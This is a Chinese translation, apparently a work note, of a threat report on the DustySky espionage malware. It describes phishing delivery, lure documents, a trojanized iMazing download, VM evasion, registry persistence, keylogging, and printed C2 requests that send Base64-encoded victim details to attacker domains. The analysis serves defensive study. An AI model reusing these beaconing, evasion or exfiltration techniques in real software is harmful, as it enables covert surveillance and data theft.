---
title: Operation DustySky文档翻译----网安组任务
date: 2019-03-01 15:46:33
tags: [source]
categories: [notes, work]
---

# 战术，技术和程序

## 交货

发送邮件到多个目标，包含链接下载压缩文件或者附件直接带有压缩文件，这是一些例子

<img src = "Operation DustySky_01.bmp" width = 80%>
<img src = "Operation DustySky_02.bmp" width = 80%>

链接可能包括以下参数：
 -  Id  - 当前恶意电子邮件消息的ID，由明文字，加号和数字组成。 例如：Rand + 281
 -  token1  - 与id相同，但Base64编码
 -  token2  - 恶意消息发送到的目标的Base64编码电子邮件地址。
 -  C  - 单词Click或openexe

匹配链接的正则表达式:
```javascript
    \/[A-Za-z]+\.php\?((?:id|token1|token2|C)=[A-Za-z0-9\/=+%]*={0,2}&?){4}
```

例子:
spynews.otzo[.]com/20151104/Update.php?id=>redacted>&token1=>redacted>&token2=>redacted>&C=Click

压缩包包含一个.exe文件，有时伪装成Microsoft Word文件，视频或其他文件格式，使用相应的图标。 例如：

<img src = "Operation DustySky_03.bmp" width = 80%>

## 诱惑内容和发件人身份

如果受害者提取存档并单击.exe文件，则在计算机感染DustySky时会显示诱饵文档或视频。

在最近的样本中，该组使用嵌入了恶意宏的Microsoft Word文件，如果启用，它将感染受害者。请注意，这些感染方法依赖于社交工程 - 说服受害者打开文件（并在禁用时启用内容） - 而不是软件漏洞。

恶意电子邮件的主题行以及诱饵文档的名称和内容通常与最近的外交，辩护和政治事件有关。有时诱惑主题是八卦或性别相关，甚至可能包括色情视频。在最近的样本中，使用了假发票和公共Google隐私政策的副本。

诱饵文档的内容始终从公共新闻项目或其他Web内容中复制，并且永远不是攻击者的原始组成。

恶意邮件中的“来自”字段通常设置为与诱饵文档相关，例如“最新以色列新闻”，“以色列热门故事”，“以色列国防军”，“（”مركزالإماراتللسياسات模仿**阿联酋政策中心组织**）。

- “该中心承担着预测区域，区域和国际政策趋势的未来以及不同地缘政治项目对该地区的影响的任务。 它旨在提供战略分析，政策文件，研究和研究，以服务于该地区任何机构或国家的决策者，优先考虑阿联酋。“

当从恶意消息链接时，恶意软件将托管在云服务上（在copy.com中多次，合法文件托管服务），或者在攻击者控制的服务器上托管。

## 网络钓鱼

当恶意软件托管在受攻击者控制的服务器上时，目标浏览器的用户代理字符串在单击恶意链接时会被检查。 如果目标使用Windows，则提供DuskySky。 如果操作系统与Windows不同，则目标服务于Google，Microsoft或Yahoo网络钓鱼页面

网络钓鱼页面的源代码由单个JavaScript块组成，在运行时将单个变量解码为HTML：

<img src = "Operation DustySky_04.png" width = 80%>

在受害者填写并发送虚假登录表单后，他们将被重定向到合法网站。 例如，在一个案例中，受害者被重定向到以色列新闻网站NRG中的新闻项目。 只有新闻项目是旧的（从攻击前一年开始）并且与恶意电子邮件的原始主题无关。 它可能用于以前的攻击，攻击者不够关心或忘记将其更改为相关攻击。

## 攻击软件开发人员

IP地址45.32.13.169以及指向它的所有域都拥有一个网页，该网页是合法且无关的软件网站的副本 -  iMazing，一种iOS管理软件。

<img src = "Operation DustySky_08.png" width = 80%>

这些域名中有一个类似的东西 - imazing[.] ga。
假网站的源代码显示它是在2015年10月22日从合法来源复制的：

<img src = "Operation DustySky_05.png" width = 80%>

虚假网站与合法网站类似，为访问者提供下载iMazing软件的功能。 但是，虚假网站上的版本与DustySky恶意软件捆绑在一起。 在执行恶意版本（2f452e90c2f9b914543847ba2b431b9a）时，安装了合法的iMazing，而在后台DustySky被删除为名为Plugin.exe（1d9612a869ad929bd4dd16131ddb133a）的文件，并执行：

<img src = "Operation DustySky_06.png" width = 80%>

有趣的是，我们发现自由职业者市场网站freelancer.com上发布的职位发布中提到的虚假域名'imazing [.] ga'。 在帖子中，攻击者声称他们正在寻找某人建立“像这个网站[sic]这样的应用程序”，并诱使观众“从'imazing [.] ga'下载应用程序并忽视[sic]” “如果有任何想法缺失或......，请告诉我。”

<img src = "Operation DustySky_09.png" width = 80%>

这种行为偏离了攻击者通常向选定（虽然很多）个人发送恶意电子邮件的模式。 我们不清楚为什么他们会追随随机感染，但我们可以想象各种原因，例如访问可用作攻击代理的计算机，或获取受害者拥有的软件的许可证。

## 感染后

本节介绍攻击者对我们调查过的受感染计算机执行的操作。 在感染计算机后，攻击者使用了DustySky的功能，以及他们随后下载到计算机的公共黑客工具。

他们在计算机中截取了屏幕截图和活动进程列表，并将它们发送到命令和控制服务器。 他们使用了BrowserPasswordDump，这是一个免费使用的公共工具，用于恢复保存在浏览器中的密码。 以下是我们在攻击者删除它后恢复的日志文件（在本例中为空）：

<img src = "Operation DustySky_10.png" width = 80%>

恶意软件还会扫描计算机以查找包含特定关键字的文件。 base64格式的关键字列表从命令和控件中检索为文本文件。 例如：

<img src = "Operation DustySky_11.png" width = 40%>

<img src = "Operation DustySky_12.png" width = 80%>

这些话告诉我们攻击者所追求的是什么：个人文件; 凭证，证书和私钥; 有关国土安全的信息。

## 滥用破坏的电子邮件帐户

在一个案例中，攻击者使用窃取的电子邮件凭据并从96.44.156.201登录，可能是他们的代理或VPN端点。 他们还从5.101.140.118登录，这是一个属于名为privatetunnel.com的代理服务的IP地址（在之前的事件中，电子邮件是从附近的地址发送的 -  5.101.140.114）。

# 恶意软件分析

DustySky（由其开发人员称为NeD）是一个用.NET编写的多阶段恶意软件。 本章将介绍其功能和主要功能。 分析的样本是589827c4cf94662544066b80bfda6ab从2015年8月下旬开始。它由DustySky dropper，DustySky核心和DustySky键盘记录组件组成。

## DustySky dropper

DustySky dropper试图逃避在虚拟机中运行。 一旦确定计算机不是VM，它就会提取，运行并向DustySky Core添加持久性。 它提取有关操作系统的基本信息，并检查是否存在防病毒。 它还提取并打开诱饵文档。

dropper的资源是在运行时删除的两个组件。 一个是诱饵文件（内部称为“新闻”），一旦执行dropper就会呈现给受害者。 另一个是DustySky Core，一个特洛伊木马后门，（内部称为“日志”）。

dropper使用以下函数来混淆函数名称和恶意软件的其他部分（在以后的版本中，使用了SmartAssembly 6.9.0.114 .NET混淆器）：

<img src = "Operation DustySky_13.png" width = 80%>

对于VM规避，dropper会检查是否存在指示恶意软件在虚拟机中运行的DLL（vboxmrxnp.dll和vmbusres.dll表示虚拟机和vmGuestlib.dll，表示vmware）。

如果dropper确实在虚拟机中运行，它将打开诱饵文档并停止其活动：

<img src = "Operation DustySky_14.png" width = 80%>

Dropper使用Windows Management Instrumentation来提取有关操作系统以及防病毒是否处于活动状态的信息。

DustySky Core被删除到％TEMP％并使用cmd或.NET界面运行。

<img src = "Operation DustySky_15.png" width = 60%>

在计算机重新启动后为持久性创建一个注册表项：

<img src = "Operation DustySky_16.png" width = 80%>

## DustySky核心

DustySky Core是一个特洛伊木马后门程序，也是恶意软件的主要组成部分。 它与命令和控制服务器通信，对收集的数据，信息和文件进行泄露，并接收和执行命令。 它具有以下功能：

- 收集有关操作系统版本，运行进程和已安装软件的信息。
- 搜索可移动媒体和网络驱动器，并将其自身复制到其中。
- 提取其他组件（例如键盘记录组件）或从命令和控制服务器接收它们，然后运行或删除它们。
- 逃避虚拟机。
- 关闭计算机或重新启动计算机。
- 确保只有一个恶意软件实例正在运行。

键盘记录日志文件每50秒上传到服务器。 这些文件通过POST请求上传到以key.php结尾的URL。

<img src = "Operation DustySky_17.png" width = 80%>

## DustySky键盘记录组件

DustySky核心中包含的组件之一是键盘记录器（例如15be036680c41f97dfac9201a7c51cfc）。 当命令和控制服务器命令时，提取并执行键盘记录器。 键盘记录日志保存到％TEMP％\ temps。

## pdb分析

DustySky示例中的pdb字符串结构如下：

b：\ World-2015 \ IL \ Working Tools \ 2015-12-27 NeD Ver 9 Rand  -  192.169.6.199 \ NeD Worm \ obj \ x86 \ Release \ MusicLogs.pdb

来自23个样本的pdb字符串显示在“附录B  - 指标”中。 在下表中，我们提供了包含pdb字符串的文件夹和文件名的细分，以反映DustySky自2015年5月首次发布以来的持续开发周期。

<img src = "Operation DustySky_18.png" width = 80%>

# 指挥与控制沟通

## 交通示例

以下是与命令和控制服务器通信的示例（标识符已被更改）。

DustySky有两个硬编码的命令和控制服务器域。 它首先通过向TEST.php或index.php发送GET请求来检查第一个是否处于活动状态，期望“OK”作为响应。 如果没有收到确定，它将尝试第二个域。

例如，这是对index.php的初始GET请求：

```shell
    GET /index.php HTTP/1.1
    Host: facetoo.co[.]vu
    Connection: Keep-Alive
```

服务器回复:

```shell
    HTTP/1.1 200 OK
    Date: Sun, 06 Sep 2015 19:52:49 GMT
    Server: Apache/2.2.15 (CentOS)
    X-Powered-By: PHP/5.3.3
    Content-Length: 2
    Connection: close
    Content-Type: text/html; charset=UTF-8
    
    OK
```

接下来，发送GET请求，其中包含有关受感染计算机的信息，如Base64参数：

```shell
    GET
    /IOS.php?Pn=9TbmRvd3KTxpbmRvd3icj4&fr=&GR=RmFjZUJvb2soSU9TKTxicj4gMjAxNS
    0wOC0yNA&com=IDxicj4gIDxicj4g&ID=386578203222222738119472812481673914678
    &o=TWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwg&ho=ZmFjZXRvby5jby52dQ==&
    av=&v=501P HTTP/1.1
    User-Agent: 386578203222222738119472812481673914678
    Host: facetoo.co[.]vu
```

GET请求中URL的另一个示例：

```shell
    http://ra.goaglesmtp.co.vu/NSR.php?Pn=MWw1bEoxVDJqQiB8IFBTUFVCV1M&fr=&GR=REFGQksoTlNSKTxicj4gMjAxNS0xMS0wNA&com=IDxicj4gIDxicj4g&ID=13327920924134561851231757518321517760252DAFBK&o=TWljcm9zb2Z0IFdpbmRvd3MgNyBIb21lIFByZW1pdW0g&ho=cmEuZ29hZ2xlc210cC5jby52dQ==&av=&v=704
```
